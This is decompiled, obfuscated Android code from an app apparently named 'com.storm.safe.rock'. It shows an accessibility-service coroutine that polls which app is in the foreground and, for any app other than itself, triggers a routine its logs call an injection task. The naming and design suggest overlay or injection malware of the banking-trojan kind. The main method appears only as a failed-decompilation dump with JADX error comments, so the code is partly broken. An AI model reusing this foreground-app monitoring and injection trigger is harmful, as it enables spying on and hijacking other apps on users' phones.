package com.storm.safe.rock.service;

import com.storm.safe.rock.service.dqtvuisjd;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$startInjectionCheckJob$1", m214403f = "dqtvuisjd.kt", m214404l = {2420, 2445}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$startInjectionCheckJob$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52710a1;

    /* renamed from: a2 */
    public /* synthetic */ Object f52711a2;

    /* renamed from: a3 */
    public final /* synthetic */ dqtvuisjd f52712a3;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$startInjectionCheckJob$1$1", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.service.dqtvuisjd$startInjectionCheckJob$1$1 */
    final class C03001 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public final /* synthetic */ dqtvuisjd f52713a1;

        /* renamed from: a2 */
        public final /* synthetic */ String f52714a2;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public C03001(InterfaceC0876mv interfaceC0876mv, dqtvuisjd dqtvuisjdVar, String str) {
            super(2, interfaceC0876mv);
            this.f52713a1 = dqtvuisjdVar;
            this.f52714a2 = str;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return new C03001(interfaceC0876mv, this.f52713a1, this.f52714a2);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) throws Throwable {
            C03001 c03001 = (C03001) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
            C1351vv c1351vv = C1351vv.f60710b1;
            c03001.invokeSuspend(c1351vv);
            return c1351vv;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            kg1.m213544f4(obj);
            dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
            this.f52713a1.m211445d0(this.f52714a2);
            return C1351vv.f60710b1;
        }
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$startInjectionCheckJob$1(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52712a3 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        dqtvuisjd$startInjectionCheckJob$1 dqtvuisjd_startinjectioncheckjob_1 = new dqtvuisjd$startInjectionCheckJob$1(this.f52712a3, interfaceC0876mv);
        dqtvuisjd_startinjectioncheckjob_1.f52711a2 = obj;
        return dqtvuisjd_startinjectioncheckjob_1;
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$startInjectionCheckJob$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /*  JADX ERROR: JadxRuntimeException in pass: RegionMakerVisitor
        jadx.core.utils.exceptions.JadxRuntimeException: Can't find top splitter block for handler:B:50:0x0049
        	at jadx.core.utils.BlockUtils.getTopSplitterForHandler(BlockUtils.java:1178)
        	at jadx.core.dex.visitors.regions.maker.ExcHandlersRegionMaker.collectHandlerRegions(ExcHandlersRegionMaker.java:53)
        	at jadx.core.dex.visitors.regions.maker.ExcHandlersRegionMaker.process(ExcHandlersRegionMaker.java:38)
        	at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:27)
        */
    /* JADX WARN: Path cross not found for [B:13:0x0049, B:37:0x009c], limit reached: 56 */
    /* JADX WARN: Path cross not found for [B:13:0x0049, B:41:0x00c2], limit reached: 56 */
    /* JADX WARN: Path cross not found for [B:13:0x0049, B:51:0x007e], limit reached: 56 */
    /* JADX WARN: Removed duplicated region for block: B:37:0x009c A[Catch: Exception -> 0x0049, TryCatch #0 {Exception -> 0x0049, blocks: (B:27:0x007e, B:29:0x0087, B:31:0x008d, B:34:0x0095, B:37:0x009c, B:39:0x00b2, B:41:0x00c2), top: B:51:0x007e }] */
    /* JADX WARN: Removed duplicated region for block: B:53:0x0064 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:25:0x007b -> B:13:0x0049). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:36:0x009b -> B:13:0x0049). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:38:0x00b0 -> B:13:0x0049). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:40:0x00c0 -> B:13:0x0049). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:42:0x00d5 -> B:13:0x0049). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final java.lang.Object invokeSuspend(java.lang.Object r9) {
        /*
            r8 = this;
            kotlin.coroutines.intrinsics.CoroutineSingletons r0 = kotlin.coroutines.intrinsics.CoroutineSingletons.f57606a0
            int r1 = r8.f52710a1
            r2 = 1
            r3 = 2
            if (r1 == 0) goto L26
            if (r1 == r2) goto L1d
            if (r1 != r3) goto L15
            java.lang.Object r1 = r8.f52711a2
            no r1 = (p000.InterfaceC0920no) r1
            p000.kg1.m213544f4(r9)     // Catch: java.lang.Exception -> L13
        L13:
            r9 = r1
            goto L49
        L15:
            java.lang.IllegalStateException r9 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r9.<init>(r0)
            throw r9
        L1d:
            java.lang.Object r1 = r8.f52711a2
            no r1 = (p000.InterfaceC0920no) r1
            p000.kg1.m213544f4(r9)
            r9 = r1
            goto L5f
        L26:
            p000.kg1.m213544f4(r9)
            java.lang.Object r9 = r8.f52711a2
            no r9 = (p000.InterfaceC0920no) r9
            java.lang.String r1 = "dqtvuisjd"
            com.storm.safe.rock.service.dqtvuisjd r4 = r8.f52712a3
            long r4 = r4.f52410e1
            java.lang.StringBuilder r6 = new java.lang.StringBuilder
            java.lang.String r7 = "📱 启动注入检测定时任务（备用机制，间隔"
            r6.<init>(r7)
            r6.append(r4)
            java.lang.String r4 = "ms）"
            r6.append(r4)
            java.lang.String r4 = r6.toString()
            p000.t60.m214714d6(r1, r4)
        L49:
            boolean r1 = p000.AbstractC1117qo.m214443d9(r9)
            if (r1 == 0) goto Ldb
            com.storm.safe.rock.service.dqtvuisjd r1 = r8.f52712a3
            long r4 = r1.f52410e1
            r8.f52711a2 = r9
            r8.f52710a1 = r2
            java.lang.Object r1 = p000.b81.m210571b1(r4, r8)
            if (r1 != r0) goto L5f
            goto Ld7
        L5f:
            com.storm.safe.rock.service.dqtvuisjd r1 = r8.f52712a3
            java.lang.Object r4 = r1.f52406d7
            monitor-enter(r4)
            java.util.LinkedHashMap r1 = r1.f52405d6     // Catch: java.lang.Throwable -> Ld8
            boolean r1 = r1.isEmpty()     // Catch: java.lang.Throwable -> Ld8
            monitor-exit(r4)
            if (r1 == 0) goto L75
            java.lang.String r9 = "dqtvuisjd"
            java.lang.String r0 = "📱 没有激活的注入任务，停止检测"
            p000.t60.m214714d6(r9, r0)
            goto Ldb
        L75:
            com.storm.safe.rock.inject.jbqfkndyx$a0 r1 = com.storm.safe.rock.inject.jbqfkndyx.f51944a4
            boolean r1 = r1.getInForeground()
            if (r1 == 0) goto L7e
            goto L49
        L7e:
            com.storm.safe.rock.service.dqtvuisjd r1 = r8.f52712a3     // Catch: java.lang.Exception -> L49
            android.view.accessibility.AccessibilityNodeInfo r1 = r1.getRootInActiveWindow()     // Catch: java.lang.Exception -> L49
            r4 = 0
            if (r1 == 0) goto L92
            java.lang.CharSequence r1 = r1.getPackageName()     // Catch: java.lang.Exception -> L49
            if (r1 == 0) goto L92
            java.lang.String r1 = r1.toString()     // Catch: java.lang.Exception -> L49
            goto L93
        L92:
            r1 = r4
        L93:
            if (r1 == 0) goto L49
            int r5 = r1.length()     // Catch: java.lang.Exception -> L49
            if (r5 != 0) goto L9c
            goto L49
        L9c:
            com.storm.safe.rock.service.dqtvuisjd r5 = r8.f52712a3     // Catch: java.lang.Exception -> L49
            android.content.Context r5 = r5.getApplicationContext()     // Catch: java.lang.Exception -> L49
            java.lang.String r5 = r5.getPackageName()     // Catch: java.lang.Exception -> L49
            java.lang.String r6 = "applicationContext.packageName"
            p000.t60.m214694b5(r5, r6)     // Catch: java.lang.Exception -> L49
            r6 = 0
            boolean r5 = kotlin.text.AbstractC0779a1.m213679d2(r1, r6, r5)     // Catch: java.lang.Exception -> L49
            if (r5 != 0) goto L49
            com.storm.safe.rock.service.dqtvuisjd r5 = r8.f52712a3     // Catch: java.lang.Exception -> L49
            android.content.Context r5 = r5.getApplicationContext()     // Catch: java.lang.Exception -> L49
            java.lang.String r5 = r5.getPackageName()     // Catch: java.lang.Exception -> L49
            boolean r5 = r1.equals(r5)     // Catch: java.lang.Exception -> L49
            if (r5 != 0) goto L49
            rh r5 = p000.AbstractC1262tj.f60233a0     // Catch: java.lang.Exception -> L49
            kotlinx.coroutines.android.a0 r5 = p000.sc0.f59953a0     // Catch: java.lang.Exception -> L49
            com.storm.safe.rock.service.dqtvuisjd$startInjectionCheckJob$1$1 r6 = new com.storm.safe.rock.service.dqtvuisjd$startInjectionCheckJob$1$1     // Catch: java.lang.Exception -> L49
            com.storm.safe.rock.service.dqtvuisjd r7 = r8.f52712a3     // Catch: java.lang.Exception -> L49
            r6.<init>(r4, r7, r1)     // Catch: java.lang.Exception -> L49
            r8.f52711a2 = r9     // Catch: java.lang.Exception -> L49
            r8.f52710a1 = r3     // Catch: java.lang.Exception -> L49
            java.lang.Object r1 = kotlinx.coroutines.AbstractC0780a0.m213696a7(r5, r6, r8)     // Catch: java.lang.Exception -> L49
            if (r1 != r0) goto L49
        Ld7:
            return r0
        Ld8:
            r9 = move-exception
            monitor-exit(r4)
            throw r9
        Ldb:
            vv r9 = p000.C1351vv.f60710b1
            return r9
        */
        throw new UnsupportedOperationException("Method not decompiled: com.storm.safe.rock.service.dqtvuisjd$startInjectionCheckJob$1.invokeSuspend(java.lang.Object):java.lang.Object");
    }
}
